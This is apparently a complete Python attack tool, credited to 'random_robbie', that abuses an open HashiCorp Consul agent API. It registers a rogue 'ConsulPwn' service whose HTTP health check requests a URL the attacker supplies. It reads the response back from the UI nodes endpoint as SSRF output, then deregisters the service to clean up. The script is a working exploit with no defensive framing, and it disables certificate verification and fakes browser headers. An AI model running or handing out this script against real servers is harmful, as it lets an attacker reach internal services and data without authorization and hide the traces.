#!/usr/bin/env python
#
#
# Author: random_robbie

import colorama
import sys
import os
import re
import json
import requests
from time import sleep
import base64
import argparse
from colorama import init, Fore, Back, Style
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import urllib3
urllib3.disable_warnings()
init(autoreset=True)


# Configuration
session = requests.Session()
parser = argparse.ArgumentParser()
parser.add_argument("-s", "--server", required=True, help="Consule Server IP")
parser.add_argument("-c", "--ssrf", required=True, help="SSRF URL")
parser.add_argument("-H", "--host", required=True, help="Host Address")
parser.add_argument("-p", "--port", required=True, help="Port Number")
args = parser.parse_args()

def remove_services(URL):
	
	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":"http://"+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.put(""+URL+"/v1/agent/service/deregister/ConsulPwn", headers=headers, verify=False)
	if response.status_code == 200:
		print (Fore.GREEN + "[*] Payload One Removed [*]")
	else:
		print(Fore.RED + '[!] Unable To Remove Payload One')
	sleep(5)
		

def grab_dc (URL):

	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":"http://"+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.get(""+URL+"/v1/catalog/datacenters", headers=headers, verify=False)
	if response.status_code == 200:
		js = json.loads(response.content)
		dc = js[0]
		print (Fore.GREEN + "[*] Datacenter Chosen [*]")
		return dc
	else:
		print(Fore.RED + '[!] Unable to parse DC\n')
		exit();
		
		
def send_payload_one (URL,SSRF,HOST,PORT):
	
	payload = '''{
  "ID": "ConsulPwn",
  "Name": "ConsulPwn",
  "Tags": [],
  "Address": "'''+HOST+'''",
  "Port": '''+PORT+''',
  "Check": {
    "Interval": "10s",
    "HTTP": "'''+SSRF+'''",
     "DeregisterCriticalServiceAfter": "10m"
  }
}
'''
	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":""+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.put(""+URL+"/v1/agent/service/register", data=payload, headers=headers, verify=False)
	if response.status_code == 200:
		print (Fore.GREEN + "[*] Payload One Sent [*]")
	else:
		print(Fore.RED + '[!] Payload One Failed\n')
		exit();
		
		

		
def parse_payload_one(URL,DC):
	paramsGet = {"dc":DC,"token":""}
	headers = {"Accept":"application/json, text/javascript, */*; q=0.01","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0","Referer":""+URL+"/ui/","Connection":"close","Accept-Language":"en-GB,en;q=0.5","Accept-Encoding":"gzip, deflate","DNT":"1"}
	response = session.get(""+URL+"/v1/internal/ui/nodes", params=paramsGet, headers=headers, verify=False)
	if response.status_code == 200:
		try:
			js = json.loads(response.text)
			for p in js:
				for Serv in p['Checks']:
					
					if Serv['ServiceName'] == "ConsulPwn":
						out = Serv['Output']
						print (Fore.GREEN + "[*] SSRF-Output: "+out+" [*]")
						return out
		
		except Exception as e:
			print('Error: %s' % e)
			exit();
					
					


try:
	print (Fore.RED +"[*] Sorry about the rubbish part for host and port [*]")
	URL = args.server
	SSRF = args.ssrf
	HOST = args.host
	PORT = args.port
	DC = grab_dc (URL)
	remove_services(URL)
	send_payload_one (URL,SSRF,HOST,PORT)
	sleep (10)
	print (Fore.GREEN + "[*] Sleeping 10 seconds to allow time for system to parse. [*]")
	parse_payload_one(URL,DC)
	sleep(3)
	remove_services(URL)
	
		
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		pass
